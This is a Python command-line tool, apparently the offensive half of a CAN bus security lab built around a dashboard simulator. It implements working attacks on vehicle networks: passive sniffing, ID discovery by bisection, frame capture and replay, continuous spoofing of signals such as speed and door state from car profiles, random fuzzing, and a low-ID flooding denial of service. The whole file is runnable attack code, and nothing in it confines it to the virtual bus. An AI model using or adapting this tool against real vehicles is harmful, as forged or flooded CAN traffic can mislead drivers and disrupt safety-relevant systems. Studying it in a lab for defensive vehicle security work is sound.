#!/usr/bin/env python3
"""
attack.py - the offensive side of the lab.

Everything here is a classic CAN weakness: the bus has no authentication and
no source identity, so any node can assert any signal. The cluster cannot
tell your frame from the real ECU's frame.

Modes:
  sniff     passively rank IDs by traffic volume
  diff      ICSIM-style bisection: find which ID controls a thing
  replay    capture now, replay later
  spoof     continuously assert one dashboard channel
  fuzz      random frames on chosen IDs
  dos       high-priority (low-ID) flooding - starves real frames

Examples:
  ./attack.py -i vcan0 sniff --seconds 5
  ./attack.py -i vcan0 spoof -c prius --channel speed --value 180
  ./attack.py -i vcan0 spoof -c prius --channel doors --value 15
  ./attack.py -i vcan0 replay --capture 6 --out logs/drive.jsonl
  ./attack.py -i vcan0 replay --play logs/drive.jsonl --loop 3
  ./attack.py -i vcan0 dos --id 0x000 --seconds 5
"""
import argparse
import json
import os
import random
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import can  # noqa: E402
from bus import open_bus, describe  # noqa: E402
import sigutil  # noqa: E402
from canframe import encode_signal  # noqa: E402
from common import load_profile, resolve  # noqa: E402


def cmd_sniff(bus, a):
    print(f"[*] sniffing {a.seconds}s ...")
    counts, first, last, samples = {}, {}, {}, {}
    t0 = time.time()
    while time.time() - t0 < a.seconds:
        m = bus.recv(timeout=0.2)
        if not m:
            continue
        i = m.arbitration_id
        counts[i] = counts.get(i, 0) + 1
        first.setdefault(i, time.time())
        last[i] = time.time()
        samples[i] = m.data.hex()
    print(f"\n{'ID':>8} {'count':>7} {'Hz':>7}  last data")
    print("-" * 56)
    for i, n in sorted(counts.items(), key=lambda kv: -kv[1]):
        span = max(1e-6, last[i] - first[i])
        hz = n / span if n > 1 else 0.0
        print(f"0x{i:06X} {n:7} {hz:7.1f}  {samples[i]}")
    print(f"\n[+] {sum(counts.values())} frames, {len(counts)} unique IDs")


def cmd_spoof(bus, a):
    prof = load_profile(resolve(a.car))
    m = prof["channels"].get(a.channel)
    if not m:
        raise SystemExit(f"[!] '{a.car}' has no channel '{a.channel}'. "
                         f"available: {', '.join(sorted(prof['channels']))}")
    val = a.value
    if a.channel == "speed":
        val = val / m.get("to_kmh", 1.0)     # user speaks km/h
    data = bytearray(m["dlc"])
    encode_signal(data, m, val)

    # cars that model each door as its own 1-bit signal: treat --value as a
    # 4-bit mask (15 = all open) and pack every door living in this frame
    if a.channel == "doors":
        mask = int(a.value)
        for bit, dch in enumerate(("door_fl", "door_fr", "door_rl", "door_rr")):
            dm = prof["channels"].get(dch)
            if dm and dm["frame_id"] == m["frame_id"]:
                encode_signal(data, dm, 1 if (mask >> bit) & 1 else 0)

    if not (m["min"] <= val <= m["max"]):
        cap = m["max"] * m.get("to_kmh", 1.0) if a.channel == "speed" \
            else m["max"]
        unit = "km/h" if a.channel == "speed" else (m["unit"] or "raw")
        print(f"    NOTE: clamped - this signal maxes out at "
              f"{cap:.1f} {unit} ({m['length']} bits @ scale {m['scale']})")
    msg = can.Message(arbitration_id=m["frame_id"],
                      is_extended_id=bool(m["is_extended"]),
                      data=bytes(data))
    print(f"[*] spoofing {a.channel}={a.value} as "
          f"0x{m['frame_id']:03X} {m['message']}.{m['signal']}")
    print(f"    payload {data.hex()}  at {a.rate} Hz  (ctrl-c to stop)")
    n, t0, iv = 0, time.time(), 1.0 / max(1.0, a.rate)
    try:
        while a.seconds <= 0 or time.time() - t0 < a.seconds:
            bus.send(msg)
            n += 1
            time.sleep(iv)
    except KeyboardInterrupt:
        pass
    print(f"[+] sent {n} frames")


def cmd_replay(bus, a):
    if a.capture:
        os.makedirs(os.path.dirname(a.out) or ".", exist_ok=True)
        print(f"[*] capturing {a.capture}s -> {a.out}")
        t0 = time.time()
        n = 0
        with open(a.out, "w") as fh:
            while time.time() - t0 < a.capture:
                m = bus.recv(timeout=0.2)
                if not m:
                    continue
                fh.write(json.dumps({"t": round(time.time() - t0, 6),
                                     "id": m.arbitration_id,
                                     "ext": bool(m.is_extended_id),
                                     "d": m.data.hex()}) + "\n")
                n += 1
        print(f"[+] captured {n} frames")
        return

    if not a.play:
        raise SystemExit("[!] use --capture SECONDS or --play FILE")
    rows = [json.loads(l) for l in open(a.play) if l.strip()]
    print(f"[*] replaying {len(rows)} frames x{a.loop} from {a.play}")
    sent = 0
    for rep in range(a.loop):
        t0 = time.time()
        for r in rows:
            wait = r["t"] / a.speed - (time.time() - t0)
            if wait > 0:
                time.sleep(wait)
            bus.send(can.Message(arbitration_id=r["id"],
                                 is_extended_id=r["ext"],
                                 data=bytes.fromhex(r["d"])))
            sent += 1
    print(f"[+] replayed {sent} frames")


def cmd_fuzz(bus, a):
    ids = [int(x, 0) for x in a.ids.split(",")] if a.ids else None
    print(f"[*] fuzzing {'ids ' + a.ids if ids else 'random IDs'} "
          f"for {a.seconds}s")
    n, t0 = 0, time.time()
    while time.time() - t0 < a.seconds:
        fid = random.choice(ids) if ids else random.randint(0, 0x7FF)
        bus.send(can.Message(
            arbitration_id=fid, is_extended_id=False,
            data=bytes(random.getrandbits(8) for _ in range(8))))
        n += 1
        time.sleep(1.0 / max(1.0, a.rate))
    print(f"[+] sent {n} fuzz frames")


def cmd_dos(bus, a):
    """Lowest ID wins CAN arbitration - flooding 0x000 starves everything."""
    fid = int(a.id, 0)
    print(f"[*] flooding 0x{fid:03X} for {a.seconds}s "
          f"(low ID = highest priority)")
    msg = can.Message(arbitration_id=fid, is_extended_id=False,
                      data=b"\xff" * 8)
    n, t0 = 0, time.time()
    while time.time() - t0 < a.seconds:
        for _ in range(200):
            bus.send(msg)
            n += 1
    print(f"[+] sent {n} frames")


def cmd_diff(bus, a):
    """ICSIM-style: snapshot IDs while idle, then while you act."""
    print(f"[*] phase 1 - DO NOTHING for {a.seconds}s")
    base = _snapshot(bus, a.seconds)
    input("[?] now hold the action (door, blinker, pedal) and press ENTER...")
    print(f"[*] phase 2 - KEEP ACTING for {a.seconds}s")
    act = _snapshot(bus, a.seconds)

    print("\n[+] IDs whose payload changed between phases:")
    for fid in sorted(set(base) | set(act)):
        b, c = base.get(fid, set()), act.get(fid, set())
        new = c - b
        if new and (fid not in base or len(new) > 0):
            tag = "NEW ID" if fid not in base else f"{len(new)} new payloads"
            print(f"    0x{fid:03X}  {tag}")
            for p in list(new)[:3]:
                print(f"            {p}")


def _snapshot(bus, seconds):
    out = {}
    t0 = time.time()
    while time.time() - t0 < seconds:
        m = bus.recv(timeout=0.2)
        if m:
            out.setdefault(m.arbitration_id, set()).add(m.data.hex())
    return out


def main():
    ap = argparse.ArgumentParser(
        description="CAN attack toolkit for the dashboard simulator")
    ap.add_argument("-i", "--interface", default="vcan0")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("sniff"); p.add_argument("--seconds", type=float, default=5)
    p = sub.add_parser("diff"); p.add_argument("--seconds", type=float, default=4)

    p = sub.add_parser("spoof")
    p.add_argument("-c", "--car", default="toyota_prius_2010_pt")
    p.add_argument("--channel", required=True)
    p.add_argument("--value", type=float, required=True)
    p.add_argument("--rate", type=float, default=50)
    p.add_argument("--seconds", type=float, default=0)

    p = sub.add_parser("replay")
    p.add_argument("--capture", type=float, default=0)
    p.add_argument("--out", default="logs/capture.jsonl")
    p.add_argument("--play")
    p.add_argument("--loop", type=int, default=1)
    p.add_argument("--speed", type=float, default=1.0)

    p = sub.add_parser("fuzz")
    p.add_argument("--ids"); p.add_argument("--rate", type=float, default=200)
    p.add_argument("--seconds", type=float, default=5)

    p = sub.add_parser("dos")
    p.add_argument("--id", default="0x000")
    p.add_argument("--seconds", type=float, default=5)

    a = ap.parse_args()
    sigutil.install()
    bus = open_bus(a.interface)
    print(f"[+] bus: {describe(a.interface)}")
    try:
        {"sniff": cmd_sniff, "spoof": cmd_spoof, "replay": cmd_replay,
         "fuzz": cmd_fuzz, "dos": cmd_dos, "diff": cmd_diff}[a.cmd](bus, a)
    except KeyboardInterrupt:
        print("\n[+] stopped")
    finally:
        bus.shutdown()


if __name__ == "__main__":
    main()
